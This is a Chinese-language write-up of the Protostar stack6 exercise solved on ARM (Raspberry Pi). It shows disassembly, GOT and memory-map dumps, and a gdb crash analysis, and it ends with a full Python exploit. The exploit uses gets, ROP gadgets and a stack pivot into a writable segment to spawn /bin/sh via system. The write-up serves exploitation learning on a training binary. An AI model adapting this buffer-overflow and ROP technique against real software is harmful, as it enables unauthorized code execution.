#stack6
@(protostar)

**试验环境**
- Raspberry Pi 2
- Linux raspberrypi 4.4.11-v7+ #888 SMP Mon May 23 20:10:33 BST 2016 armv7l GNU/Linux

getpath函数汇编代码：
```armasm
.text:000104D8 ; =============== S U B R O U T I N E =======================================
.text:000104D8
.text:000104D8 ; Attributes: bp-based frame
.text:000104D8
.text:000104D8                 EXPORT getpath
.text:000104D8 getpath                                 ; CODE XREF: main+14p
.text:000104D8
.text:000104D8 s               = -0x50
.text:000104D8 var_10          = -0x10
.text:000104D8
.text:000104D8                 STMFD   SP!, {R4,R11,LR}
.text:000104DC                 ADD     R11, SP, #8
.text:000104E0                 SUB     SP, SP, #0x4C
.text:000104E4                 MOV     R4, LR
.text:000104E8                 LDR     R0, =aInputPathPleas ; "input path please: "
.text:000104EC                 BL      printf
.text:000104F0                 LDR     R3, =__bss_start
.text:000104F4                 LDR     R3, [R3]
.text:000104F8                 MOV     R0, R3          ; stream
.text:000104FC                 BL      fflush
.text:00010500                 SUB     R3, R11, #-s
.text:00010504                 MOV     R0, R3          ; s
.text:00010508                 BL      gets
.text:0001050C                 MOV     R3, R4
.text:00010510                 STR     R3, [R11,#var_10]
.text:00010514                 LDR     R3, [R11,#var_10]
.text:00010518                 AND     R3, R3, #0xBF000000
.text:0001051C                 CMP     R3, #0xBF000000
.text:00010520                 BNE     loc_10538
.text:00010524                 LDR     R0, =aBzzztP    ; "bzzzt (%p)\n"
.text:00010528                 LDR     R1, [R11,#var_10]
.text:0001052C                 BL      printf
.text:00010530                 MOV     R0, #1          ; status
.text:00010534                 BL      _exit
.text:00010538 ; ---------------------------------------------------------------------------
.text:00010538
.text:00010538 loc_10538                               ; CODE XREF: getpath+48j
.text:00010538                 SUB     R3, R11, #-s
.text:0001053C                 LDR     R0, =aGotPathS  ; "got path %s\n"
.text:00010540                 MOV     R1, R3
.text:00010544                 BL      printf
.text:00010548                 SUB     SP, R11, #8
.text:0001054C                 LDMFD   SP!, {R4,R11,PC}
.text:0001054C ; End of function getpath
```
原题在x86上考的是ROP，但在ARM上返回地址的限制并不存在。exp的方法有很多，这里说两种。

关闭ALSR，而且我们已获取`system`函数和`/bin/sh`字符串的地址，则通过的`pop {r0,r4,pc}`，即可跳转到`system`函数执行shell。

另外一种，查看GOT表：
`objdump -R stack6`
```bash
➜  stack6 git:(master) ✗ objdump -R stack

stack:     file format elf32-littlearm

DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
00020750 R_ARM_GLOB_DAT    __gmon_start__
0002075c R_ARM_COPY        stdout
00020734 R_ARM_JUMP_SLOT   printf
00020738 R_ARM_JUMP_SLOT   gets
0002073c R_ARM_JUMP_SLOT   fflush
00020740 R_ARM_JUMP_SLOT   _exit
00020744 R_ARM_JUMP_SLOT   __libc_start_main
00020748 R_ARM_JUMP_SLOT   __gmon_start__
0002074c R_ARM_JUMP_SLOT   abort
```

我们可以通过`get`函数将`/bin/sh`字符串写入可读写的内存。
```bash
gef> vmmap
     Start        End     Offset Perm Path
0x00010000 0x00011000 0x00000000 r-x /home/pi/protostar/stack/stack6/stack
0x00020000 0x00021000 0x00000000 rwx /home/pi/protostar/stack/stack6/stack
0x76e63000 0x76f8e000 0x00000000 r-x /lib/arm-linux-gnueabihf/libc-2.19.so
0x76f8e000 0x76f9e000 0x0012b000 --- /lib/arm-linux-gnueabihf/libc-2.19.so
0x76f9e000 0x76fa0000 0x0012b000 r-x /lib/arm-linux-gnueabihf/libc-2.19.so
0x76fa0000 0x76fa1000 0x0012d000 rwx /lib/arm-linux-gnueabihf/libc-2.19.so
0x76fa1000 0x76fa4000 0x00000000 rwx
0x76fba000 0x76fbf000 0x00000000 r-x /usr/lib/arm-linux-gnueabihf/libarmmem.so
0x76fbf000 0x76fce000 0x00005000 --- /usr/lib/arm-linux-gnueabihf/libarmmem.so
0x76fce000 0x76fcf000 0x00004000 rwx /usr/lib/arm-linux-gnueabihf/libarmmem.so
0x76fcf000 0x76fef000 0x00000000 r-x /lib/arm-linux-gnueabihf/ld-2.19.so
0x76ff7000 0x76ffb000 0x00000000 rwx
0x76ffb000 0x76ffc000 0x00000000 r-x [sigpage]
0x76ffc000 0x76ffd000 0x00000000 r-- [vvar]
0x76ffd000 0x76ffe000 0x00000000 r-x [vdso]
0x76ffe000 0x76fff000 0x0001f000 r-x /lib/arm-linux-gnueabihf/ld-2.19.so
0x76fff000 0x77000000 0x00020000 rwx /lib/arm-linux-gnueabihf/ld-2.19.so
0x7efdf000 0x7f000000 0x00000000 rwx [stack]
0xffff0000 0xffff1000 0x00000000 r-x [vectors]
```
当调用`get`函数时，会将`LR`的寄存器值入栈，以便函数返回。我们查看`getpath`函数的汇编代码可知，`LR`的值是`0x10548`，即`get`函数返回执行以下两条指令：
```armasm
.text:00010548                 SUB     SP, R11, #8
.text:0001054C                 LDMFD   SP!, {R4,R11,PC}
```
所以，我们可以先通过覆盖栈上`R11`的值，当`get`函数返回执行`0x10548`的指令，从而修改栈指针。

这里有个坑，之前将`R11`修改成`0x20000`，却得到
```bash
(gdb)c
Program received signal SIGSEGV, Segmentation fault.
do_system (line=0x20000 "/bin/sh") at ../sysdeps/posix/system.c:55
55	in ../sysdeps/posix/system.c
```
`bt`之后，查看`do_system`汇编代码，可见`do_system`函数本身会申请一定量的栈空间，而`0x20000`以下的空间并不是可写的，所以就`Segmentation fault`了。
```bash
(gdb) bt
#0  do_system (line=0x20000 "/bin/sh") at ../sysdeps/posix/system.c:55
#1  0x00000a76 in ?? ()
Backtrace stopped: previous frame identical to this frame (corrupt stack?)
(gdb) disas do_system
Dump of assembler code for function do_system:
=> 0x76e9c8e8 <+0>:	push	{r4, r5, r6, r7, r8, r9, r10, lr}
   0x76e9c8ec <+4>:	sub	sp, sp, #312	; 0x138
   0x76e9c8f0 <+8>:	mov	r4, #0
   0x76e9c8f4 <+12>:	add	r9, sp, #176	; 0xb0
```
最后的exp：
```python
from zio import *

c_read  = COLORED(RAW, 'green')
c_write = COLORED(RAW, 'blue')

io = zio("./stack", print_read = c_read, print_write = c_write, timeout = 10000)
#io.gdb_hint([0x10548])

system_addr = 0x76e9cfac
#pop {r0,r4,pc}
ppp = 0x76edd12c
#mov r0,r4 ; pop {r4,pc}
mpp = 0x76e9e784
plt_get = 0x10368
new_r11 = 0x20508

payload1 = "A"*76
payload1 += l32(0x20508)
payload1 += l32(ppp)
payload1 += l32(0x20500)
payload1 += "AAAA"
payload1 += l32(plt_get)

payload2 = l32(0x20514)
payload2 += "A"*4
payload2 += l32(mpp)
payload2 += "A"*4
payload2 += l32(system_addr)
payload2 += "/bin/sh\x00"

io.read_until("input path please:")
io.writeline(payload1)
io.writeline(payload2)
io.interact()
```
![Alt text](./flow.png)
